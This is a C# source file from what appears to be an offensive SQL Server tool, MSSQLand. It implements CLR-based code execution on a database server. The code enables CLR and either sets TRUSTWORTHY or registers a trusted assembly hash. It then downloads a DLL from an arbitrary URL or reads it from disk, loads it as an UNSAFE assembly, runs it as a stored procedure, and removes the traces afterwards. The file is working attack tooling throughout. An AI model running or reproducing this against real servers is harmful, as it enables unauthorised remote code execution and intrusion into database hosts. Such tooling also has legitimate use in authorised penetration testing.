using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using MSSQLand.Utilities;
using MSSQLand.Services;
using MSSQLand.Models;

namespace MSSQLand.Actions.Execution
{
    internal class ClrExecution : BaseAction
    {
        private string _dllURI;
        private string _function;

        public override void ValidateArguments(string additionalArguments)
        {
            // Split the additional argument into parts (dll URI and function)
            string[] parts = SplitArguments(additionalArguments);

            if (parts.Length == 1)
            {
                _dllURI = parts[0].Trim();
                _function = "Main";
            }
            else if (parts.Length == 2)
            {
                _dllURI = parts[0].Trim();
                _function = parts[1].Trim();
            }

            else
            {
                throw new ArgumentException("Invalid arguments. CLR execution usage: dllURI function or dllURI");
            }

            if (string.IsNullOrEmpty(_dllURI))
            {
                throw new ArgumentException("The dllURI cannot be empty.");
            }
        }

        public override void Execute(DatabaseContext databaseContext)
        {
            // Step 1: Get the SHA-512 hash for the DLL and its bytes.
            string[] library = ConvertDLLToSQLBytes(_dllURI);

            if (library.Length != 2 || string.IsNullOrEmpty(library[0]) || string.IsNullOrEmpty(library[1]))
            {
                Logger.Error("Failed to convert DLL to SQL-compatible bytes.");
                return;
            }

            if (databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1) == false)
            {
                return;
            }

            string libraryHash = library[0];
            string libraryHexBytes = library[1];

            Logger.Info($"SHA-512 Hash: {libraryHash}");
            Logger.Info($"DLL Bytes Length: {libraryHexBytes.Length}");

            string assemblyName = Guid.NewGuid().ToString("N").Substring(0, 6);
            string libraryPath = Guid.NewGuid().ToString("N").Substring(0, 6);

            string dropProcedure = $"DROP PROCEDURE IF EXISTS [{_function}];";
            string dropAssembly = $"DROP ASSEMBLY IF EXISTS [{assemblyName}];";
            string dropClrHash = $"EXEC sp_drop_trusted_assembly 0x{libraryHash};";

            Logger.Task("Starting CLR assembly deployment process");
            try
            {

                if (databaseContext.Server.Legacy)
                {
                    Logger.Info("Legacy server detected. Enabling TRUSTWORTHY property");
                    databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY ON;");
                }
                else
                {
                    if (databaseContext.ConfigService.RegisterTrustedAssembly(libraryHash, libraryPath) == false)
                    {
                        return;
                    }
                }

                // Step 1: Drop existing procedure and assembly if they exist
                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);


                // Step 3: Create the assembly from the DLL bytes
                Logger.Task("Creating the assembly from DLL bytes");
                databaseContext.QueryService.ExecuteNonProcessing(
                    $"CREATE ASSEMBLY [{assemblyName}] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE;");

                if (!databaseContext.ConfigService.CheckAssembly(assemblyName))
                {
                    Logger.Error("Failed to create a new assembly");
                    databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                    databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                    return;
                }

                Logger.Success($"Assembly '{assemblyName}' successfully created");

                // Step 4: Create the stored procedure linked to the assembly
                Logger.Task("Creating the stored procedure linked to the assembly");
                databaseContext.QueryService.ExecuteNonProcessing(
                    $"CREATE PROCEDURE [dbo].[{_function}] AS EXTERNAL NAME [{assemblyName}].[StoredProcedures].[{_function}];");

                if (!databaseContext.ConfigService.CheckProcedures(_function))
                {
                    Logger.Error("Failed to create the stored procedure");
                    databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                    databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                    databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                    return;
                }

                Logger.Success($"Stored procedure '{_function}' successfully created");

                // Step 5: Execute the stored procedure
                Logger.Task($"Executing the stored procedure '{_function}'");
                databaseContext.QueryService.ExecuteNonProcessing($"EXEC {_function};");
                Logger.Success("Stored procedure executed successfully");

                // Step 6: Cleanup - Drop procedure, assembly, and trusted hash
                Logger.Task("Performing cleanup");
                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);

                // Step 7: Reset TRUSTWORTHY property for legacy servers
                if (databaseContext.Server.Legacy)
                {
                    Logger.Info("Resetting TRUSTWORTHY property");
                    databaseContext.QueryService.ExecuteNonProcessing(
                        $"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY OFF;");
                }

                Logger.Success("Cleanup completed");
            }
            catch (Exception ex)
            {
                Logger.Error($"Error during CLR assembly deployment: {ex.Message}");
                // Perform cleanup in case of failure
                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);

                if (databaseContext.Server.Legacy)
                {
                    databaseContext.QueryService.ExecuteNonProcessing(
                        $"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY OFF;");
                }
            }
        }


        /// <summary>
        /// Take a .NET assembly on disk and cnovert it
        /// to SQL compatible byte format for storage in a stored procedure.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private static string[] ConvertDLLToSQLBytesFile(string dll)
        {
            string[] dllArr = new string[2];
            string dllHash = "";
            string dllBytes = "";

            // Read the DLL, create an SHA-512 hash for it and convert the DLL to SQL compatible bytes.
            try
            {
                FileInfo fileInfo = new(dll);
                Logger.Info($"{dll} is {fileInfo.Length} bytes.");

                // Get the SHA-512 hash of the DLL, so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
                using (SHA512 sha512 = SHA512.Create())
                {
                    using FileStream fileStream = File.OpenRead(dll);
                    foreach (byte hash in sha512.ComputeHash(fileStream))
                    {
                        dllHash += hash.ToString("x2");
                    }
                }

                // Read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server.
                foreach (Byte b in File.ReadAllBytes(dll))
                {
                    dllBytes += b.ToString("X2");
                }

            }
            catch (FileNotFoundException)
            {
                Logger.Error($"Unable to load {dll}");
            }

            dllArr[0] = dllHash;
            dllArr[1] = dllBytes;
            return dllArr;
        }

        /// <summary>
        /// Downloads a .NET assembly from a remote HTTP/S location and converts it
        /// to SQL-compatible byte format for storage in a stored procedure.
        /// </summary>
        /// <param name="dll">The URL of the DLL to download.</param>
        /// <returns>An array containing the SHA-512 hash and SQL-compatible byte string.</returns>
        private static string[] ConvertDLLToSQLBytesWeb(string dll)
        {
            try
            {
                // Ensure a valid URL is provided
                if (string.IsNullOrWhiteSpace(dll) || (!dll.StartsWith("http://") && !dll.StartsWith("https://")))
                {
                    throw new ArgumentException($"Invalid DLL URL: {dll}");
                }

                Logger.Info($"Downloading DLL from {dll}");

                // Set up secure protocols for downloading the DLL
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;

                // Download the DLL content
                byte[] dllBytes;
                using (var client = new WebClient())
                {
                    dllBytes = client.DownloadData(dll);
                }

                Logger.Info($"DLL downloaded successfully, size: {dllBytes.Length} bytes");

                // Compute the SHA-512 hash
                string dllHash;
                using (var sha512 = SHA512.Create())
                {
                    dllHash = BitConverter.ToString(sha512.ComputeHash(dllBytes)).Replace("-", "").ToLower();
                }

                Logger.Info($"SHA-512 hash computed: {dllHash}");

                // Convert the DLL bytes to a SQL-compatible hexadecimal string
                string dllHexString = BitConverter.ToString(dllBytes).Replace("-", "").ToUpper();

                return new[] { dllHash, dllHexString };
            }
            catch (WebException ex)
            {
                Logger.Error($"Failed to download DLL from {dll}. Web exception: {ex.Message}");
            }
            catch (Exception ex)
            {
                Logger.Error($"An error occurred while processing the DLL: {ex.Message}");
            }

            // Return empty values in case of failure
            return new[] { string.Empty, string.Empty };
        }

        /// <summary>
        /// This method determines if the .NET assembly resides locally
        /// on disk, or remotely on a web server.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private static string[] ConvertDLLToSQLBytes(string dll)
        {
            string[] dllArr = dll.ToLower().Contains("http://") || dll.ToLower().Contains("https://")
            ? ConvertDLLToSQLBytesWeb(dll)
            : ConvertDLLToSQLBytesFile(dll);

            return dllArr;
        }
    }
}
